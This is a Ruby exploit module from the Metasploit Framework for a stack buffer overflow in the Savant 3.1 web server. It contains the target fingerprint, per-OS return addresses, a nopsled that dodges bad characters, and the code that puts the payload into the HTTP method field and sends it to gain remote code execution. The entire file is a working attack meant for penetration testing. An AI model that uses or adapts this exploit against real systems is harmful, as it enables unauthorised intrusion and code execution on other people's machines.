##
# $Id: savant_31_overflow.rb 10546 2010-10-04 20:53:51Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerprint = { :pattern => [ /Savant\\/3\\.1/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			\'Name\'        => \'Savant 3.1 Web Server Overflow\',
			\'Description\' => %q{
					This module exploits a stack buffer overflow in Savant 3.1 Web Server. The service
				supports a maximum of 10 threads (for a default install). Each exploit attempt
				generally causes a thread to die whether sucessful or not. Therefore, in a default
				configuration, you only have 10 chances.

				Due to the limited space available for the payload in this exploit module, use of the
				\"ord\" payloads is recommended.
			},
			\'Author\'      => [ \'patrick\' ],
			\'Arch\'		  => [ ARCH_X86 ],
			\'License\'     => MSF_LICENSE,
			\'Version\'     => \'$Revision: 10546 $\',
			\'References\'  =>
				[
					[ \'CVE\', \'2002-1120\' ],
					[ \'OSVDB\', \'9829\' ],
					[ \'BID\', \'5686\' ],
					[ \'URL\', \'http://www.milw0rm.com/exploits/787\' ],
				],
			\'Privileged\'  => false,
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'thread\',
				},
			\'Payload\'	  =>
				{
					\'Space\'			   => 253,
					\'BadChars\'        => \"\\x00\\x0a\\x0d\\x25\",
					\'StackAdjustment\' => -3500,
					\'Compat\'          =>
						{
							\'ConnectionType\' => \'+ws2ord\',
						},
				},
			\'Platform\'    => [\'win\'],
			\'Targets\'     =>
				[
					# Patrick - Tested OK 2007/08/08 : w2ksp0, w2ksp4, xpsp2 en.
					[ \'Universal Savant.exe\', 	    { \'Ret\' => 0x00417a96 } ], # p/r Savant.exe
					[ \'Windows 2000 Pro All - English\', { \'Ret\' => 0x750211aa } ], # p/r ws2help.dll
					[ \'Windows 2000 Pro All - Italian\', { \'Ret\' => 0x74fd2ac5 } ], # p/r ws2help.dll
					[ \'Windows 2000 Pro All - French\',  { \'Ret\' => 0x74fa36b2 } ], # p/r ws2help.dll
					[ \'Windows XP Pro SP2 - English\',   { \'Ret\' => 0x71ab76ed } ], # p/r ws2help.dll
				],
			\'DisclosureDate\' => \'Sep 10 2002\',
			\'DefaultTarget\' => 0))
	end

	def check
		info = http_fingerprint  # check method
		if info and (info =~ /Savant\\/3\\.1/)
			return Exploit::CheckCode::Vulnerable
		end
		Exploit::CheckCode::Safe
	end


	def safe_nops(count)
		# We need to find a safe nop combination.
		# Savant will change some chars in the http method type - anything before the \"/\".
		#
		# For example, \"GET /\" will remain \"GET /\", however
		# \"\\xe0 /\" will be modified to \"\\xc0 /\" ...
		# \"\\xfe /\" will be modified to \"\\xde /\" ...
		# \"\\xff /\" will be modified to \"\\x9f /\"
		# The code after the \"/\" - our payload - is unchanged >=)
		#
		# Savant bad_chars for the nops

		bad_nop_chars = [*(0xe0..0xff)].pack(\"C*\")

		nopsled = make_nops(count) # make_nops includes the payload bad_chars
			bad_nop_chars.each_byte { |badbyte|
				nopsled.each_byte { |goodbyte|
				if (goodbyte == badbyte)
					return false
				end
			}
		}
		return nopsled
	end


	def exploit
		print_status(\"Searching for a suitable nopsled...\")
		findnop = safe_nops(24) # If we use short jump or make_nops(), sled will be corrupted.
		until findnop
			findnop = safe_nops(24) # If nops are banned, generate a new batch.
		end

		print_status(\"Found one! Sending exploit.\")
		sploit = findnop + \" /\" + payload.encoded + [target[\'Ret\']].pack(\'V\')
		res = send_request_raw(
			{
				\'method\'  => sploit,
				\'uri\'     => \'/\'
			}, 5)
		if (res)
			print_error(\'The server responded, that can\\\'t be good.\')
		end

		handler
	end

end
